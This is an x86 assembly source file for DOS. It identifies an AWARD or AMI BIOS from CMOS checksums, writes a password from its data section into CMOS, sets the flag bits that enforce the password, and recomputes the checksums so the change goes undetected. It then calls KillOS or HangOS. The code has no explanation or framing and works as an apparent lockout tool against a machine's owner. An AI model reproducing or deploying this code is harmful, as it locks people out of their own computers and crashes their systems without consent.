locals
.286
.model large, PASCAL

INCLUDE cmos.inc

EXTRN   Exit:PROC
EXTRN   KillOS:PROC
EXTRN   HangOS:PROC

GLOBAL  Main:PROC
GLOBAL  SetAWARD:PROC
GLOBAL  SetAMI:PROC

.data

INCLUDE data.mac

.code

Main    PROC PASCAL
        push    48h
        push    79h
        call    CalculateChecksum
        mov     bx, ax

        push    7Ah
        call    ReadCMOSW

        cmp     ax, bx
        jne     Try_AMI

        call    SetAWARD
        jmp     short Bye

Try_AMI:
        push    37h
        push    3Dh
        call    CalculateChecksum
        mov     bx, ax

        push    40h
        push    7Ch
        call    CalculateChecksum
        add     bx, ax

        push    3Eh
        call    ReadCMOSW

        cmp     ax, bx
        jne     Bye

        call    SetAMI

Bye:
        cmp     [ExitMode], 1
        jnz     Not_Kill
        call    KillOS
Not_Kill:
        cmp     [ExitMode], 2
        jnz     Not_Hang
        call    HangOS
Not_Hang:
        call    Exit
ENDP Main


;*************************************
; Password storage routines
;*************************************
SetAWARD PROC PASCAL
        USES    ax

	push	11h
	call	ReadCMOS

	or      al, 3

	push	11h
	push	ax
	call	WriteCMOS

        push    1Ch
        push    [WORD PTR AWARD+0]
        call    WriteCMOS

        push    1Dh
        push    [WORD PTR AWARD+1]
        call    WriteCMOS

        push    10h
        push    2Dh
        call    CalculateChecksum

        push    2Eh
        push    ax
        call    WriteCMOSW

        ret
ENDP SetAWARD


SetAMI PROC PASCAL
        USES    ax, bx, si, di

        push    29h
	call	ReadCMOS

        or      al, 10h

        push    29h
	push	ax
	call	WriteCMOS

        push    10h
        push    2Dh
        call    CalculateChecksum

        push    2Eh
        push    ax
        call    WriteCMOSW

        mov     di, 37h
        mov     si, offset AMI

Send:
        push    di
        push    [si]
        call    WriteCMOS

        inc     si
        inc     di

        cmp     di, 3Dh
        jle     short Send

        push    37h
        push    3Dh
        call    CalculateChecksum
        mov     bx, ax

        push    40h
        push    7Ch
        call    CalculateChecksum
        add     ax, bx

        push    3Eh
        push    ax
        call    WriteCMOSW

        ret
ENDP SetAMI

END
